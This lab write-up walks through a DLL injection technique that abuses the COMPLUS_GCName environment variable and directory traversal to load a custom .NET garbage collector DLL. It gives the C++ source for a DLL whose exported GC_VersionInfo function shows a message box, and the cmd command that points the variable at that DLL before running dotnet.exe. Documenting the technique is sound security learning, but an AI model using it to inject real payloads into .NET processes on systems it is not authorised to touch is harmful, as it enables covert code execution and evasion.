# DLL Injection via a Custom .NET Garbage Collector

This is a quick lab to test a DLL injection technique discovered by [@am0nsec](https://twitter.com/am0nsec), which he describes in his blogpost [https://www.contextis.com/us/blog/bring-your-own-.net-core-garbage-collector](https://www.contextis.com/us/blog/bring-your-own-.net-core-garbage-collector) - go check it out!

The idea behind this technique is that a low privileged user can specify a custom Garbage Collector \(GC\), that a  .NET application should use. A custom GC can be specified by setting a command shell environment variable `COMPLUS_GCName`, that points to a malicious DLL which represents a custom Garbage Collector.

{% hint style="warning" %}
Normally, specifying a custom GC requires administartor privileges, however, since path to a custom GC in `COMPLUS_GCName` is not sanitized when a custom GC is loaded, directory traversal allows **any** unprivileged user to specify a custom GC to be loaded from an arbitrary location to which they can drop their DLL.
{% endhint %}

The Gargage Collector DLL needs to export `GC_VersionInfo` method for this technique to work - this is the method that will contain our payload, that will be executed once a .NET program starts and loads our custom GC DLL.

## Execution

Let's create a DLL that represents a custom Garbage Collector. It needs to export a function `GC_VersionInfo`, which in our case executes a simple message box:

```cpp
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

struct VersionInfo
{
    UINT32 MajorVersion;
    UINT32 MinorVersion;
    UINT32 BuildVersion;
    const char* Name;

};

extern "C" __declspec(dllexport) void GC_VersionInfo(VersionInfo * info)
{
    info->BuildVersion = 0;
    info->MinorVersion = 0;
    info->BuildVersion = 0;
    MessageBoxA(NULL, "Injection", "Injection", 0);
}
```

Once the DLL is compiled, we can set the `COMPLUS_GCName` environment variable in our cmd.exe shell and point it to the compiled DLL:

```text
set COMPLUS_GCName=..\..\..\..\..\..\..\..\..\..\..\..\..\labs\GarbageCollector\GC\x64\Release\GC.dll & dotnet.exe -h
```

We can execute any .NET binary found on the system and it will load our GC.dll. In this lab, we do:

```text
dotnet.exe -h
```

Below shows that our GC.dll got injected into the dotnet.exe:

![](../../.gitbook/assets/image%20%28536%29.png)

## References

{% embed url="https://www.contextis.com/us/blog/bring-your-own-.net-core-garbage-collector" %}

